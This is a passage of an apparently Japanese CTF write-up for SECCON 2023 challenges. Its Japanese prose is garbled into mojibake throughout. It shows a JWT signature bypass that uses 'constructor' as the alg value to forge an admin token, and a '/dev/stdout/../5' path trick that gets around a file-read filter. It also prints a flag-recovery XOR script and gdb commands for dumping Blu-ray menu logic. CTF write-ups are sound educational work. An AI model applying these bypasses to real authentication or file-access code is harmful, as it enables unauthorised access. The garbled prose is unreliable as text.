</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">signature</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parseToken</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">token</span>) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parts</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">3</span>) <span style="color:#66d9ef">throw</span> Error(<span style="color:#e6db74">&#39;Invalid JWT format&#39;</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> [ <span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">signature</span> ] <span style="color:#f92672">=</span> <span style="color:#a6e22e">parts</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsedHeader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsePart</span>(<span style="color:#a6e22e">header</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parsedPayload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsePart</span>(<span style="color:#a6e22e">payload</span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> { <span style="color:#a6e22e">header</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsedHeader</span>, <span style="color:#a6e22e">payload</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsedPayload</span>, <span style="color:#a6e22e">signature</span> }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">verify</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">secret</span>) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">signature</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">expected_signature</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseToken</span>(<span style="color:#a6e22e">token</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">calculated_signature</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createSignature</span>(<span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">secret</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">header</span>, <span style="color:#a6e22e">payload</span>, <span style="color:#a6e22e">expected_signature</span>, <span style="color:#a6e22e">calculated_signature</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">calculated_buf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">calculated_signature</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">expected_buf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">expected_signature</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">compare</span>(<span style="color:#a6e22e">calculated_buf</span>, <span style="color:#a6e22e">expected_buf</span>) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">throw</span> Error(<span style="color:#e6db74">&#39;Invalid signature&#39;</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>JavaScriptã«ã¯ã“ã®ã‚ˆã†ãª<del>ã‚¯ã‚½</del>æ¥½ã—ã„ä»•æ§˜ãŒã‚ã‚‹ã®ã§:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> {}.<span style="color:#a6e22e">constructor</span>
</span></span><span style="display:flex;"><span>[Function<span style="color:#f92672">:</span> Object]
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> Object(<span style="color:#e6db74">&#34;foo&#34;</span>, <span style="color:#e6db74">&#34;bar&#34;</span>)
</span></span><span style="display:flex;"><span>[String<span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;foo&#39;</span>]
</span></span></code></pre></div><p>ãƒ˜ãƒƒãƒ€ãƒ¼ã®<code>alg</code>ã¨ã—ã¦<code>constructor</code>ã‚’æ¸¡ã™ã¨ã€<code>createSignature()</code>ã®2è¡Œç›®ãŒ</p>
<pre tabindex="0"><code>const signature = algorithms[header.alg.toLowerCase()](data, secret);
â†“
const signature = algorithms[&#34;constructor&#34;](data, secret);
â†“
const signature = Object(data, secret);
â†“
const signature = data;
â†“
const signature = `${stringifyPart(header)}.${stringifyPart(payload)}`;
</code></pre><p>ã¨ãªã‚Šã€signatureã®è¨ˆç®—çµæœãŒäºˆæ¸¬å¯èƒ½ãªå€¤ã«ã§ãã¦ã—ã¾ã„ã¾ã™ã€‚</p>
<p>signatureã«<code>.</code>ã‚’å…¥ã‚Œã‚‹ã¨<code>parseToken()</code>ã§ã‚¨ãƒ©ãƒ¼ãŒå‡ºã‚‹ã®ã§ã€ä¸€è¦‹<code>${stringifyPart(header)}.${stringifyPart(payload)}</code>ã‚’signatureã¨ã—ã¦æ¸¡ã™ã“ã¨ã¯ã§ããªã„ã‚ˆã†ã«è¦‹ãˆã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€<code>Buffer.from(..., 'base64')</code>ã«ã¯BASE64ã«ãªã„æ–‡å­—ã‚’ç„¡è¦–ã™ã‚‹ä»•æ§˜ãŒã‚ã‚‹ãŸã‚ã€headerã®ãŒ<code>alg</code>ãŒ<code>&quot;constructor&quot;</code>ã€payloadã®<code>isAdmin</code>ãŒ<code>true</code>ã€signatureãŒ<code>${stringifyPart(header)}${stringifyPart(payload)}</code>ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¸¡ã›ã°ã€signatureãŒå†è¨ˆç®—çµæœ <code>${stringifyPart(header)}.${stringifyPart(payload)}</code>ã¨ä¸€è‡´ã™ã‚‹ã¨åˆ¤å®šã•ã‚Œã¦æ¤œè¨¼ã‚’é€šã£ã¦ã—ã¾ã„ã¾ã™ã€‚</p>
<h3 id="readme-2023-misc">readme 2023 (misc)</h3>
<p>å•é¡Œ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> mmap
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>alarm(<span style="color:#ae81ff">60</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex;"><span>    mm <span style="color:#f92672">=</span> mmap<span style="color:#f92672">.</span>mmap(f<span style="color:#f92672">.</span>fileno(), <span style="color:#ae81ff">0</span>, prot<span style="color:#f92672">=</span>mmap<span style="color:#f92672">.</span>PROT_READ)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Flag does not exist&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;path: &#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;flag.txt&#39;</span> <span style="color:#f92672">in</span> path:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] Path not allowed&#34;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;fd&#39;</span> <span style="color:#f92672">in</span> path:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] No more fd trick ;)&#34;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(path), <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        print(f<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0x100</span>))
</span></span></code></pre></div><p><code>flag.txt</code>ã‚’ãƒ¡ãƒ¢ãƒªã«ãƒãƒƒãƒ—ã—ãŸå¾Œã€ãƒ•ã‚¡ã‚¤ãƒ«åã«<code>flag.txt</code>ã¨<code>fd</code>ãŒå«ã¾ã‚Œãªã„ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®å…ˆé ­256ãƒã‚¤ãƒˆã‚’ä½•åº¦ã§ã‚‚èª­ã¿ã ã›ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’æ”»ç•¥ã™ã‚‹å•é¡Œã§ã™ã€‚</p>
<p><code>/proc/self</code>ã‚’æ‚ªç”¨ã—ã¦ãã ã•ã„ã¨è¨€ã‚ã‚“ã°ã‹ã‚Šãªæ„Ÿã˜ã§ã™ãŒã€<code>/proc/self/fd</code>ã¯å¡ãŒã‚Œã¦ãŠã‚Šã€<code>/proc/self/map_files</code>ã‚’ä½¿ãŠã†ã«ã‚‚ã€å…ˆé ­256ãƒã‚¤ãƒˆã—ã‹èª­ã¾ãªã„ã®ã§<code>/proc/self/maps</code>ã§ã¯flagã®ä½ç½®ã‚’ç‰¹å®šã§ãã¾ã›ã‚“ã€‚</p>
<p>çµå±€ Pythonã®<code>os.path.realpath()</code>ã«é€”ä¸­ã®è¦ç´ ãŒãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ãªãã¦ã‚‚ã‚¨ãƒ©ãƒ¼ã«ãªã‚‰ãªã„ã¨ã„ã†ä»•æ§˜ãŒã‚ã‚‹ã“ã¨ã«æ°—ã¥ãã€<code>/proc/self/fd/1</code>ã¸ã®ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã® <code>/dev/stdout</code>ã‚’ä½¿ã£ã¦ <code>/dev/stdout/../5</code> (â†’ <code>/proc/self/fd/1/../5</code> â†’ <code>/proc/self/fd/5</code>) ã‚’èª­ã¾ã›ã¦è§£ãã¾ã—ãŸã€‚</p>
<p>å®Ÿã¯<code>/proc/self/auxv</code>ã‚„<code>/proc/self/syscall</code>ã§å–ã‚Œã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨flagã®ç›¸å¯¾ä½ç½®ã¯å¸¸ã«ä¸€å®šãªã®ã§ã€ã“ã‚Œã§ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç‰¹å®šã—ã¦<code>map_files</code>ã§èª­ã‚€ã®ãŒæƒ³å®šè§£ã‚‰ã—ã„ã§ã™ã€‚</p>
<p>exploit:</p>
<pre tabindex="0"><code>/dev/stdout/../5
</code></pre><h3 id="jumpout-reversing">jumpout (reversing)</h3>
<p>é›£èª­åŒ–ã•ã‚ŒãŸflagåˆ¤å®šãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’è§£æã—ã¦Flagã‚’é€†ç®—ã™ã‚‹å•é¡Œã§ã™ã€‚</p>
<p>ãƒ‡ãƒãƒƒã‚¬ã§å‡¦ç†ã‚’è¿½ã£ã¦ã„ãã¨ã€ã¾ãšå…¥åŠ›ã®é•·ã•ãŒ29æ–‡å­—ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã€æ¬¡ã«<code>å…¥åŠ› xor æ–‡å­—ã®ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ xor 0x55 xor è¬ã®ãƒ‡ãƒ¼ã‚¿</code>ã®çµæœãŒ<code>è¬ã®ãƒ‡ãƒ¼ã‚¿ãã®2</code>ã¨ä¸€è‡´ã™ã‚‹ã¨æ­£è§£ã«ãªã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚å…¥åŠ›ã®ã‹ã‚ã‚Šã«<code>è¬ã®ãƒ‡ãƒ¼ã‚¿ãã®2</code>ã¨xorã™ã‚Œã°FlagãŒé€†ç®—ã§ãã¾ã™ã­ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>v1 <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0x68</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0x09</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0xf1</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x81</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v2 <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x0b</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0x50</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x3f</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0xf3</span>,<span style="color:#ae81ff">0xc7</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xaa</span>,<span style="color:#ae81ff">0xb2</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0xb4</span>,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0x23</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x1d</span>):
</span></span><span style="display:flex;"><span>    flag<span style="color:#f92672">.</span>append(chr(i <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x55</span> <span style="color:#f92672">^</span> v1[i] <span style="color:#f92672">^</span> v2[i]))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(flag))
</span></span></code></pre></div><p><code>pwn.xor()</code>ãªã‚‹ä¾¿åˆ©ãªé–¢æ•°ãŒpwntoolsã«ã‚ã‚‹ã“ã¨ã‚’çµ‚äº†å¾Œã«çŸ¥ã‚Šã¾ã—ãŸã€‚å‹ã‹ã‚‰ã“ã¡ã‚‰ã®æ„å›³ã‚’å¯Ÿã—ã¦ã‚ˆã—ãªã«ã‚„ã£ã¦ãã‚Œã‚‹ã¿ãŸã„ã§ã™ã€‚è³¢ã„!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> xor(v1,v2,<span style="color:#ae81ff">0x55</span>,list(range(len(v1))))
</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SECCON</span><span style="color:#e6db74">{jump_table_everywhere}</span><span style="color:#e6db74">&#39;</span>
</span></span></code></pre></div><p>å®Ÿã¯ã‚ã–ã‚ã–è§£æã—ãªãã¦ã‚‚angrã«é£Ÿã‚ã›ã‚Œã°ä¸€ç¬ã§è§£ã‘ãŸã‚‰ã—ã„ã§ã™ã€‚ã¨ãã«ã‚½ãƒ­ãƒ—ãƒ¬ã‚¤ã§ã¯æ™‚é–“ã¨ã®æˆ¦ã„ãªã®ã§ã€ã“ã†ã„ã†è³¢ã„è§£æ³•ã‚’ã‚µãƒƒã¨æ€ã„ã¤ã‘ã‚‹ã‚ˆã†ã«ãªã‚ŠãŸã„ã§ã™ã­ã€‚</p>
<h3 id="perfect-blu-reversing">Perfect Blu (reversing)</h3>



<div class="figure center nocaption" >
  
    <img class="fig-img" src="perfect-blu.jpg"  alt="Perfect Blu Screenshot">
  
  
</div>

<p>ã“ã‚“ãªæ„Ÿã˜ã®Blu-ray ãƒ‡ã‚£ã‚¹ã‚¯ã‚’è§£æã—ã¦Flagã‚’ç‰¹å®šã™ã‚‹å•é¡Œã§ã™ã€‚</p>
<p>Blu-ray ãƒ‡ã‚£ã‚¹ã‚¯ã®ãƒ¡ãƒ‹ãƒ¥ãƒ¼ç”»é¢ã£ã¦ä»®æƒ³ãƒã‚·ãƒ³ã§å®Ÿè£…ã•ã‚Œã¦ã„ã‚‹ã‚“ã§ã™ã­ã€‚</p>
<p>ä»•æ§˜ã‚’èª¿ã¹ãŸã¨ã“ã‚ã€ã©ã†ã‚„ã‚‰ <code>/BDMV/MovieObject.bdmv</code>ã«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒå…¥ã£ã¦ã„ã‚‹ã‚ˆã†ãªã®ã§ã€ã¾ãšãƒ‘ãƒ¼ã‚µãƒ¼ã‚’æ›¸ã“ã†ã¨ã—ãŸã‚‚ã®ã®ã€ã†ã¾ãå‹•ã‹ãªã„ã—æ™‚é–“ãŒã‹ã‹ã‚Šã™ãã‚‹ã®ã§æ–­å¿µã—ã¾ã—ãŸã€‚</p>
<p><code>BD_DEBUG_MASK=0x10000 BD_DEBUG_FILE=/tmp/bd-debug vlc ISO</code> ã®ã‚ˆã†ã«ã—ã¦libblurayã®ãƒ‡ãƒãƒƒã‚°ã‚’æœ‰åŠ¹ã«ã—ãŸVLCã§å¼„ã£ã¦ã¿ã‚‹ã¨ã€ã©ã†ã‚„ã‚‰é¸æŠè‚¢ãŒæ­£è§£ã®ã¨ãã¯ <code>1â†’2â†’3â†’...</code>ã®ã‚ˆã†ã«é †ç•ªã«ãƒãƒ£ãƒ—ã‚¿ãƒ¼ãŒé·ç§»ã—ã€ä¸æ­£è§£ã®ã¨ãã¯é›¢ã‚ŒãŸãƒãƒ£ãƒ—ã‚¿ãƒ¼ç•ªå·ã«é£›ã°ã•ã‚Œã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã—ãŸã€‚<br>
ã“ã‚Œã§é¸æŠã—ãŸæ–‡å­—ãŒæ­£è§£ã‹ä¸æ­£è§£ã‹<strong>æ±ºå®šå¾Œ</strong>ã«åˆ†ã‹ã‚‹ã‚ˆã†ã«ãªã£ãŸã‚‚ã®ã®ã€ä¸æ­£è§£ã®ãŸã³ã«ãƒ¢ãƒƒã‚µãƒªé…ã„BDã®ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã§ç¢ºå®šã—ã¦ã„ã‚‹éƒ¨åˆ†ã‚’å…¥åŠ›ã—ãªãŠã—ã¦ã„ã‚‹ã¨æ™‚é–“ãŒã‹ã‹ã‚Šã™ãã¾ã™ã€‚ã©ã†ã«ã‹ã—ã¦æ±ºå®šå‰ã«é·ç§»å…ˆã‚’ç‰¹å®šã—ãŸã„!</p>
<p>libblurayã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª¿ã¹ã‚‹ã¨ã€<code>_user_input</code>ã§ã‚­ãƒ¼å…¥åŠ›ã‚’å—ã‘ã¨ã£ã¦é¸æŠã—ãŸãƒœã‚¿ãƒ³ã®ãƒ‡ãƒ¼ã‚¿ <code>(BD_IG_BUTTON*)</code> ã‚’å–å¾—ã—ã¦ãŠã‚Šã€ãã®ãƒ‡ãƒ¼ã‚¿ã®<code>-&gt;nav_cmds</code>ã«æ±ºå®šæ™‚ã«å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ãŒè¨˜éŒ²ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚Šã¾ã™ã€‚</p>
<p>ã‚ã¨ã¯libblurayã‚’ãƒ‡ãƒãƒƒã‚°ãƒ“ãƒ«ãƒ‰ã—ã€</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nix" data-lang="nix"><span style="display:flex;"><span><span style="color:#75715e"># default.nix</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> <span style="color:#f92672">import</span> <span style="color:#e6db74">&lt;nixpkgs&gt;</span> {}; <span style="color:#66d9ef">let</span>
</span></span><span style="display:flex;"><span>  libbluray_ <span style="color:#f92672">=</span> enableDebugging libbluray;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">in</span>
</span></span><span style="display:flex;"><span>  vlc<span style="color:#f92672">.</span>override {
</span></span><span style="display:flex;"><span>    libbluray <span style="color:#f92672">=</span> libbluray_;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nix-build
</span></span></code></pre></div><p>gdbã‚’ã‚¢ã‚¿ãƒƒãƒã—ã¦é·ç§»å‘½ä»¤ã‚’ãƒ€ãƒ³ãƒ—</p>
<pre tabindex="0"><code class="language-gdb" data-lang="gdb">set follow-fork-mode parent
set detach-on-fork on
b *(_user_input+855)
command 1
silent
p *(((BD_IG_BUTTON *)$rax)-&gt;nav_cmds+2)
continue
end
</code></pre><p>ã“ã‚Œã§ãƒœã‚¿ãƒ³ã‚’é¸æŠã—ãŸæ®µéšã§æ­£è§£ãƒ»ä¸æ­£è§£ãŒåˆ†ã‹ã‚‹ã‚ˆã†ã«ãªã£ãŸã®ã§ã€å¾Œã¯Flagã‚’ä¸€æ–‡å­—ã¥ã¤èª¿ã¹ã¦ã„ãã ã‘ã§ã™ã€‚</p>
<p>ã¨ã“ã‚ã§ã€ä½•ã§æœ€åˆã«å‹•çš„è§£æã›ãšã«ãƒ‘ãƒ¼ã‚µãƒ¼ã‚’æ›¸ãå§‹ã‚ã¦æ™‚é–“ã‚’ç„¡é§„ã«æµªè²»ã—ãŸã‚“ã§ã™ã‹ã­ã€‚ã“ã†ã„ã†ã®ã¯ã€ã¨ã¦ã‚‚ã€è‰¯ããªã„ã€ãƒ˜ ã‚¿ ã‚¯ ã‚½ !!</p>
<p>å®Ÿã¯diffã§é·ç§»å…ˆãŒç‰¹å®šã§ãã‚‹ã‚‰ã—ã„ã§ã™ã€‚ã¨ãã«ã‚½ãƒ­ãƒ—ãƒ¬ã‚¤ã§ã¯æ™‚é–“ã¨ã®æˆ¦ã„ãªã®ã§ã€ã“ã†ã„ã†è³¢ã„è§£æ³•ã‚’ã‚µãƒƒã¨æ€ã„ã¤ã‘ã‚‹ã‚ˆã†ã«ãªã‚ŠãŸã„ã§ã™ã­ (2å›ç›®)ã€‚
<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">- Sickle: sys.audithookã§powãŒä½¿ã‚ã‚Œã¦ã„ãã†ãªã“ã¨ãŒã‚ã‹ã‚‹ã®ã§ã€powé–¢æ•°ã‚’hookã™ã‚‹ã¨å‡¦ç†ã‚’ã‚¨ã‚¹ãƒ‘ãƒ¼ã§ãã‚‹<br>- Perfect Blu: vlcã®å‡ºåŠ›ã‚’è¦‹ã‚‹ã¨ãƒãƒ£ãƒ—ã‚¿ãƒ¼ã§ã®ã‚ªãƒ¼ãƒˆãƒãƒˆãƒ³ã«ãªã£ã¦ãã†ã€‚(n).m2tsã¨(n+47).m2tsã®diffãŒ1 bitã—ã‹ãªãã€ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒé·ç§»å…ˆã«è©²å½“ã—ã¦ã„ã‚‹</p>&mdash; keymoonâ€‹ (@kymn_) <a href="https://twitter.com/kymn_/status/1703278268059979787?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</p>
<p>æƒ³å®šè§£ãŒæ°—ã«ãªã‚‹â€¦</p>
<h3 id="selfcet-pwning">selfcet (pwning)</h3>
<p>å•é¡Œ:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define INSN_ENDBR64 (0xF30F1EFA) </span><span style="color:#75715e">/* endbr64 */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define CFI(f)                                              \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ({                                                        \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      __builtin_trap();                                     \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (f);                                                    \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  })
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define KEY_SIZE 0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> key[KEY_SIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[KEY_SIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>error;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> status;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>throw)(<span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>, ...);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">ctx_t</span>;
</span></span><span style="display:flex;"><span>
